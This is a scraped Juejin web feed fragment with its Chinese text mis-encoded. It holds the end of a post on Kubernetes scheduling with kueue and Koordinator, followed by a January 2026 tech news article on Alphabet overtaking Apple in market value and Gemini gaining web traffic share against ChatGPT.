<p>æœ‰å…³kueueçš„ä½¿ç”¨ï¼Œè¯·å‚è€ƒï¼šğŸ‰åœ¨k8sè°ƒåº¦çš„èŠ±å›­é‡Œé¢æŒ–å‘€æŒ–</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af86968363a548c89d8a55d9392227f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768473544&amp;x-signature=Ln6jP9Fk%2BLqc1ZxG9UQuTNunPEo%3D" alt="" loading="lazy"/></p>
<p>ä¸ºé€‚é…AIå·¥ç¨‹åŒ–çš„è°ƒåº¦è¦æ±‚ï¼Œæˆ‘ä»¬ä½¿ç”¨Koordinatorè°ƒåº¦å™¨æ”¯æŒäº†binpackè£…ç®±è°ƒåº¦ã€‚</p>
<p>ä»€ä¹ˆå«binpackï¼Œ ä¸ºä»€ä¹ˆAIè®­ç»ƒéœ€è¦binpackï¼Œ è¯·å‚è€ƒ:ğŸ‰å·ä¸è¿‡AIç®—æ³•ï¼Œ AIå·¥ç¨‹åŒ–æˆ–è®¸æ˜¯ä¸€ä¸ªå‡ºè·¯ï¼Ÿ</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35b9b328e91e40c2bf4872f7b9271f88~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768473544&amp;x-signature=6Tcjlss0QwrUvkDusx1glcuPVCo%3D" alt="" loading="lazy"/></p>
<p>æœ€åå¹³å°éœ€è¦ç®¡æ§å¤šæ¸ é“çš„ä»»åŠ¡ï¼Œæˆ‘ä»¬ä½¿ç”¨ informeræœºåˆ¶ç›‘å¬äº†å¤šæ¸ é“ä»»åŠ¡å¹¶å›æ˜¾åˆ°é¡µé¢ï¼Œ è¿™é‡Œæœ‰ä¸ªæŠ€æœ¯ç‚¹ï¼Œå€¼å¾—å‚è€ƒã€‚</p>
<p>ğŸš€ç³Ÿç³•ï¼Œæˆ‘å®ç°çš„k8s informerå¥½åƒæ˜¯ä¾æ‰˜ç­”è¾©</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa22df713bba4f869d1fe77130801318~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768473544&amp;x-signature=a3wrXsxMSOriLAkWpw9Zg1ex%2BBk%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å…¨çƒç¬¬äºŒæ˜“ä¸»ï¼Œè°·æ­Œé€†è¢­ç™»é¡¶ï¼OpenAI 500 äº¿è‚¡ç¥¨æ± æ›å…‰ï¼ŒIlya èººèµš 40 äº¿]]></title>    <link>https://juejin.cn/post/7592811397505253427</link>    <guid>https://juejin.cn/post/7592811397505253427</guid>    <pubDate>2026-01-08T10:18:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592811397505253427" data-draft-id="7592811397505220659" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å…¨çƒç¬¬äºŒæ˜“ä¸»ï¼Œè°·æ­Œé€†è¢­ç™»é¡¶ï¼OpenAI 500 äº¿è‚¡ç¥¨æ± æ›å…‰ï¼ŒIlya èººèµš 40 äº¿"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,OpenAI"/> <meta itemprop="datePublished" content="2026-01-08T10:18:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ–°æ™ºå…ƒ"/> <meta itemprop="url" content="https://juejin.cn/user/952600743642312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å…¨çƒç¬¬äºŒæ˜“ä¸»ï¼Œè°·æ­Œé€†è¢­ç™»é¡¶ï¼OpenAI 500 äº¿è‚¡ç¥¨æ± æ›å…‰ï¼ŒIlya èººèµš 40 äº¿
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/952600743642312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ–°æ™ºå…ƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T10:18:21.000Z" title="Thu Jan 08 2026 10:18:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/98e1b301752e435c9a8310affc063492~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=f7VEYydlQhHqD3HvJCFGs%2F5gKU0%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-0"><strong>ã€Œã€æ–°æ™ºå…ƒå¯¼è¯»ã€‘åˆšåˆšï¼Œè°·æ­Œæ¯å…¬å¸æˆä¸ºå…¨çƒå¸‚å€¼ TOP 2ï¼Œå¸‚å€¼å·²è¾¾ 3.885 ä¸‡äº¿ç¾å…ƒï¼åœ¨ 2026 é¦–ä¸ªå…¨çƒ AI è¿½è¸ªæŠ¥å‘Šä¸­ï¼ŒGemini çš„å¸‚åœºä»½é¢ä¹Ÿåœ¨ç–¯æ¶¨ã€‚è¢«é€¼æ€¥çš„ OpenAIï¼Œå¹²è„†ç”©å‡º 500 äº¿ç¾å…ƒçš„å‘˜å·¥è‚¡ç¥¨æ± ï¼Œæ®è¯´ Ilya å°±åˆ†èµ°äº† 40 äº¿ã€‚ã€</strong></h5>
<p>ä»Šå¤©ï¼Œè°·æ­Œæ˜¯æ·æŠ¥é¢‘ä¼ ï¼</p>
<p>å°±åœ¨åˆšåˆšï¼Œè°·æ­Œæ¯å…¬å¸ Alphabet çš„å¸‚å€¼è¶…è¿‡è‹¹æœï¼Œæˆä¸ºå…¨çƒå¸‚å€¼ç¬¬äºŒé«˜çš„å…¬å¸ã€‚</p>
<p>Alphabet å½“å‰å¸‚å€¼çº¦ä¸º 3.885 ä¸‡äº¿ç¾å…ƒï¼Œç•¥é«˜äºè‹¹æœçš„ 3.846 ä¸‡äº¿ç¾å…ƒã€‚è€Œè‹±ä¼Ÿè¾¾ä¾ç„¶ä»¥ 4.595 ä¸‡äº¿ç¾å…ƒçš„å¸‚å€¼é¥é¥é¢†å…ˆï¼Œç¨³å±…å…¨çƒç¬¬ä¸€ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6a23cd3576c43c091fe172b1969a109~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=t8QQvWZgw%2FjVmD4KUDDqWofYQ5o%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/29658ea75f2f4b789002132d2e958e93~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=5Sk74vGbYE7TrybNkRS4P37o4UE%3D" alt="" loading="lazy"/></p>
<p>ä¸ä»…å¦‚æ­¤ï¼Œå°±åœ¨åˆšåˆšå‘å¸ƒçš„ 2026 å¹´é¦–ä¸ªå…¨çƒäººå·¥æ™ºèƒ½è¿½è¸ªæŠ¥å‘Šä¸­ï¼ŒGemini çš„åŠ¿å¤´å‡¶çŒ›ï¼ŒChatGPT åˆ™å¼€å§‹ç‹‚è·Œã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad1abd4985a343f681de0c4cfee14f9b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=0S1OMwT2rTBqq4RFEuhgzMHoALc%3D" alt="" loading="lazy"/></p>
<p>å¯ä»¥çœ‹å‡ºï¼Œä» 12 ä¸ªæœˆå‰åˆ°ç°åœ¨ï¼Œå„å®¶ AI äº§å“çš„æ”»å®ˆä¹‹åŠ¿å¼€å§‹è½¬æ¢ã€‚Gemini çš„çš„å¸‚åœºä»½é¢å·²ç»è¶…è¿‡äº† 20%ï¼Œè€Œ ChatGPT åˆ™è·Œç ´äº† 65% å¤§å…³ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8fbfd0ba0f040cb82583134d4f722db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=QUYLqViAnpRFWYw3KukHymVTHh8%3D" alt="" loading="lazy"/></p>
<p>å¤–åª’çº·çº·å‘æ–‡ç‚¹èµè°·æ­Œï¼šå®ƒå·²ç»é€†è½¬é¢“åŠ¿ï¼ŒæŠŠ OpenAI è¸©åœ¨è„šä¸‹äº†ï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/605992587cc54cafb85f9cfbbb956876~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=fuw59CmdFvd927fcYcZdYnqSDwE%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c90fe213e3c444fc8e685449f487399f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=%2FcuS0JP0S7R1xtf4QQchF6wajII%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œå¸‚å€¼åè¶…è‹¹æœã€</strong></p>
<p><strong>ã€Œè°·æ­Œé‡å¤ºå…¨çƒç¬¬äºŒã€</strong></p>
<p>å¯ä»¥è¯´ï¼Œè°·æ­Œå¸‚å€¼é‡å›å…¨çƒç¬¬äºŒï¼Œè¿™æ˜¯å®ƒåº”å¾—çš„ã€‚</p>
<p>è‡ªå»å¹´å¤æœ«ä»¥æ¥ï¼Œè°·æ­Œçš„è‚¡ä»·å°±ä¸€ç›´åœ¨æŒç»­èµ°é«˜ã€‚</p>
<p>å½“æ—¶ï¼Œä¸€åè”é‚¦æ³•å®˜è£å®šè°·æ­Œåœ¨æœç´¢ä¸šåŠ¡ä¸­æ„æˆéæ³•å„æ–­åï¼Œä»…æ–½åŠ äº†ç›¸å¯¹è¾ƒè½»çš„å¤„ç½šã€‚è¿™ä¸€ç»“æœï¼Œå°±å¤§å¤§ç¼“è§£äº†å¸‚åœºçš„æ‹…å¿§æƒ…ç»ªã€‚</p>
<p>è€Œæœ€è¿‘è°·æ­Œåœ¨ AI é¢†åŸŸçš„å‹‡çŒ›è¡¨ç°ï¼Œè¯æ˜å®ƒå·²ç»å½»åº•è¿½èµ¶ä¸Š OpenAIï¼Œè®©æŠ•èµ„äººä¿¡å¿ƒå¤§å¢ã€‚</p>
<p>2025 å¹´ï¼Œè°·æ­Œè‚¡ä»·ç´¯è®¡ä¸Šæ¶¨äº† 65%ï¼Œæˆä¸ºå¤§å‹ç§‘æŠ€è‚¡ä¸­è¡¨ç°æœ€å¥½çš„å…¬å¸ï¼›ä»Šå¹´ä»¥æ¥ï¼Œå®ƒè‚¡ä»·åˆç»§ç»­ä¸Šæ¶¨äº† 2.9%ã€‚</p>
<p>ç›¸æ¯”ä¹‹ä¸‹ï¼Œè‹¹æœè‚¡ä»·è¡¨ç°æ˜æ˜¾é€Šè‰²ã€‚2025 å¹´å…¨å¹´ä»…ä¸Šæ¶¨ 8.6%ï¼Œè€Œä»Šå¹´ä»¥æ¥åˆ™å·²ä¸‹è·Œ 4%ã€‚</p>
<p>è¿™ä¹Ÿæ˜¯èµ„æœ¬å¸‚åœºåœ¨ç”¨çœŸé‡‘ç™½é“¶æŠ•ç¥¨ï¼šåœ¨ AI å®šä¹‰çš„æœªæ¥ï¼Œè°·æ­Œæ˜¾ç„¶æ¯”è‹¹æœæ›´å…·æƒ³è±¡åŠ›ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/211c175f73cd46ed9d1ac99e0a74b26e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=OaNJo4oMXciqjaW3D%2Bb5CEG4QG8%3D" alt="" loading="lazy"/></p>
<p>è°·æ­Œè”åˆ›è°¢å°”ç›– Â· å¸ƒæ—ï¼ˆå³ï¼‰åœ¨å¹´åº¦å¼€å‘è€…å¤§ä¼šä¸Šä¸ DeepMind éƒ¨é—¨è´Ÿè´£äºº Hassabis äº¤è°ˆ</p>
<p><strong>ã€Œ<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7daac66ae5c4d50b6915f41c66554e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=s3xksfy%2F20JNFluniKr8JL2j1qY%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œä¸€å¼ æµé‡å›¾ï¼Œè®© OpenAI æ‹‰å“è­¦æŠ¥ã€</strong></p>
<p>å¦‚å¼€å¤´æ‰€è¨€ï¼ŒSimilarweb çš„è¿™å¼ æµé‡å¯¹æ¯”å›¾ï¼Œæ­ç¤ºäº†ä¸€ä¸ªè®© OpenAI æå…¶å±é™©çš„ä¿¡å·â€”â€”AI ç«èµ›çš„é£å‘ï¼Œå˜äº†ï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/28a6dd9eca7744279297ec14cf108f19~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=3gTqKoKDJuFu4B7lmwkcds2GDpo%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26ace172e9494da8a01aa3eda1c81524~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=bc5U8UIhE65KZSilFr8%2FHMqpa%2Bw%3D" alt="" loading="lazy"/></p>
<p>è‡ª**ã€Œå»å¹´ 11 æœˆè°·æ­Œå‘å¸ƒ Gemini 3 Proã€** ä»¥æ¥ï¼š<strong>ã€ŒChatGPT ç½‘ç«™</strong>ã€Œ<strong>ã€Œæµé‡ã€</strong>ã€<strong>éª¤é™ï¼ŒGemini çš„ç½‘ç«™æµé‡åˆ™å¿«é€Ÿä¸Šå‡ã€‚ã€</strong></p>
<p>å»å¹´ 12 æœˆï¼ŒGemini çš„æµé‡**ã€Œç¯æ¯”****å¢é•¿ 28.4%ï¼Œ**ã€ŒChatGPT çš„æµé‡åˆ™ã€<strong>ç¯æ¯”ä¸‹é™ 5.6%ã€‚ã€</strong></p>
<p>Menlo Ventures åˆä¼™äºº <strong>ã€ŒDeedy Dasã€</strong> æŒ‡å‡ºè¿™ç»„æ•°æ®åï¼Œå¼•å‘äº†ç§‘æŠ€åœˆçš„å¹¿æ³›è®¨è®ºã€‚</p>
<p><strong>ã€Œæ˜¾ç„¶ï¼Œç”¨æˆ·æ³¨æ„åŠ›ï¼Œæ­£åœ¨å‘ç”Ÿè¾¹é™…è½¬ç§»ã€‚ã€</strong></p>
<p>è™½ç„¶æ ¹æ® Similar Web çš„æ•°æ®ï¼Œ12 æœˆå„å¤§ AI ç½‘ç«™çš„è®¿é—®é‡ä¸­ï¼ŒChatGPT ä»ç„¶ç¨³å±…ç¬¬ä¸€ï¼Œä½†çœŸæ­£å€¼å¾—è­¦æƒ•çš„å´æ˜¯å¢é•¿ç‡å·®å¼‚ã€‚</p>
<p>ä»å¢é€Ÿä¸Šæ¥çœ‹ï¼ŒChatGPT ä¸º 49.5%ï¼ŒGemini å´è¾¾åˆ°äº†ç–¯ç‹‚çš„ 563.6%ï¼</p>
<p>è¿™å°±æ„å‘³ç€ï¼ŒGemini æ­£åœ¨ç»å†ä¸€ä¸ªå…¸å‹çš„ã€Œè¿½èµ¶çˆ†å‘æœŸã€ï¼Œè€Œ ChatGPT çš„å¢é€Ÿå·²ç»åœ¨æ”¾ç¼“ã€‚</p>
<p>æ˜¾ç„¶ï¼ŒGemini 3 å’Œ Nano Banana å‘å¸ƒåæé«˜çš„å¸‚åœºè¯„ä»·ï¼Œæ’¬åŠ¨äº†æ•´ä¸ªå±€é¢ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43ebe6c62bad45829ad7076198f10b5c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=tNkD51B6DsAhVD5hfcoFYzgNJK8%3D" alt="" loading="lazy"/></p>
<p>ä¸è¿‡ï¼Œæ›´è®© OpenAI æ„Ÿåˆ°å‹åŠ›çš„ï¼Œæ˜¯è°·æ­Œçš„ç»“æ„æ€§ä¼˜åŠ¿ã€‚</p>
<p>è°·æ­ŒçœŸæ­£çš„ç‹ç‰Œï¼Œä¸æ˜¯æ¨¡å‹ï¼Œè€Œæ˜¯å…¥å£ã€‚å®ƒç›¸å¯¹ OpenAI çš„æœ€å¤§ä¼˜åŠ¿ï¼Œå°±æ˜¯å‡ ä¹æ‰€æœ‰äººéƒ½åœ¨ç”¨è°·æ­Œâ€”â€”æœç´¢ï¼Œæµè§ˆå™¨ï¼ŒAndroidï¼ŒWorkspaceï¼Œè€Œ Gemini å¯ä»¥æ— ç¼åµŒå…¥è¿™äº›é«˜é¢‘åœºæ™¯ã€‚</p>
<p>ä¸Šé¢è¿™å¼ æµé‡å›¾æ˜­ç¤ºå‡ºï¼šAI ç«èµ›ï¼Œå·²ç»è¿›å…¥ç¬¬äºŒé˜¶æ®µã€‚ä»å‰æ¯”æ‹¼çš„æ˜¯æ¨¡å‹èƒ½åŠ›ï¼Œè€Œç°åœ¨ï¼Œæ¯”çš„å°±æ˜¯å…¥å£ã€äº§å“å½¢æ€å’Œç”¨æˆ·ä¹ æƒ¯ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/872fe89e02cc4fe9a39b72d4edb75e6d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=tGIl7V2Hwh%2BtSFu4Jw29AeuO0zY%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œ<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f5120288c8846ce940d6eb8cb1c05b8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=slTZl9T0kMZBVtWmTZe0MXvQbIc%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œ2025ï¼Œè°·æ­ŒæˆåŠŸé€†è¢­ã€</strong></p>
<p>æ›¾ç»çš„ AI çƒ­æ½®ä¸­ï¼Œä¿å®ˆçš„è°·æ­Œä¼¼ä¹èŠ‚èŠ‚è´¥é€€ã€‚</p>
<p>å¾ˆå°‘æœ‰äººé¢„æ–™åˆ°ï¼Œè°·æ­Œä¼šåœ¨ 2025 å¹´å®Œæˆä¸€åœºæ¼‚äº®çš„åå‡»â€”â€”</p>
<p>ç”¨å¤šå¹´ç§¯ç´¯çš„ç§‘ç ”åŸºç¡€å’Œæ•°åäº¿åˆ©æ¶¦ï¼Œä¸æ–­ç ¸å‘ AI ç ”å‘ï¼›è°·æ­Œå¤§è„‘ä¸ DeepMind ä¸¤å¤§ç ”ç©¶ç»„ç»‡åˆå¹¶ï¼›Nano Banana æ€èµ·å…¨ç½‘çƒ­æ½®ï¼›Gemini 3ï¼Œç›´æ¥å‡»è´¥ OpenAI çš„æœ€å¼ºæ——èˆ°æ¨¡å‹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9425d8207954427b82cd516c532ddeee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=wcIuj%2BdyMaYFlg5AW2rHxTQy6Do%3D" alt="" loading="lazy"/></p>
<p>å…¨æ ˆæ•´åˆèƒ½åŠ›ï¼Œè®©è°·æ­Œä»æ•°æ®ä¸­å¿ƒã€TPU èŠ¯ç‰‡åˆ°äº§å“çº§ç”Ÿæ€éƒ½å…¨é¢é¢†å…ˆï¼›æœç´¢ã€æµè§ˆã€åœ°å›¾ã€é‚®ä»¶ç­‰å…¥å£ï¼Œè®©å®ƒæ·±åº¦è¿æ¥æ—¥å¸¸ç”Ÿæ´»åœºæ™¯ã€‚</p>
<p>è¿™èƒŒåï¼Œæ˜¯è°·æ­Œå¤šå¹´æ²‰æ·€çš„æŠ€æœ¯ä¸ç”Ÿæ€å®åŠ›ï¼ŒçŸ­æœŸå†…å¾ˆéš¾è¢«å“ªä¸ªå®éªŒå®¤è¿½ä¸Šã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œå°±æ˜¯ä¸€åœºç”Ÿæ€ã€æµé‡ä¸äººç±»æ³¨æ„åŠ›çš„æˆ˜äº‰ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/42eb29ba6e0940afa192a803ff2d2648~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=uXH5Qb7DoNa5qtg1tpwpdR1nXRE%3D" alt="" loading="lazy"/></p>
